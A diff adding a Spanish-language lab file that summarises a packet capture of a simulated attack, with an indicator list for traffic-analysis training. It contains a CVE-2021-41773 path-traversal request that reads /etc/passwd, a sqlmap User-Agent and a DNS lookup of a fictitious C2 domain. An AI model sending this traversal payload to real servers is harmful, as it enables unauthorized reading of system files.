@@ -1,0 +1,50 @@
+# Representación educativa de una captura PCAP (texto).
+# En producción se usaría un .pcap binario; aquí el lab analiza el resumen.
+
+Frame 1: Ethernet / IPv4 / TCP
+  Src: 10.0.0.50:51234  Dst: 10.0.0.10:80
+  Flags: SYN
+  Info: Client inicia handshake HTTP
+
+Frame 2: Ethernet / IPv4 / TCP
+  Src: 10.0.0.10:80  Dst: 10.0.0.50:51234
+  Flags: SYN, ACK
+
+Frame 3: Ethernet / IPv4 / TCP
+  Src: 10.0.0.50:51234  Dst: 10.0.0.10:80
+  Flags: ACK
+
+Frame 4: Ethernet / IPv4 / TCP / HTTP
+  Src: 10.0.0.50:51234  Dst: 10.0.0.10:80
+  Request: GET /admin/login HTTP/1.1
+  Host: lab.internal
+  User-Agent: sqlmap/1.7.2
+  Info: User-Agent de herramienta de ataque
+
+Frame 5: Ethernet / IPv4 / TCP / HTTP
+  Src: 10.0.0.10:80  Dst: 10.0.0.50:51234
+  Response: HTTP/1.1 403 Forbidden
+  Server: Apache/2.4.49 (Unix)
+  Info: Versión Apache conocida por path traversal (CVE-2021-41773)
+
+Frame 6: Ethernet / IPv4 / TCP / HTTP
+  Src: 10.0.0.50:51234  Dst: 10.0.0.10:80
+  Request: GET /cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+  Info: Path traversal attempt
+
+Frame 7: Ethernet / IPv4 / TCP / HTTP
+  Src: 10.0.0.10:80  Dst: 10.0.0.50:51234
+  Response: HTTP/1.1 200 OK
+  Body snippet: root:x:0:0:root:/root:/bin/bash
+  Info: Posible exfiltración de /etc/passwd
+
+Frame 8: Ethernet / IPv4 / DNS
+  Src: 10.0.0.50:53122  Dst: 8.8.8.8:53
+  Query: evil-lab.example.invalid A
+  Info: Resolución DNS hacia dominio sospechoso (C2 ficticio)
+
+# IOCs de laboratorio
+# - UA: sqlmap/1.7.2
+# - Path: /cgi-bin/.%2e/ ... /etc/passwd
+# - Server: Apache/2.4.49
+# - DNS: evil-lab.example.invalid
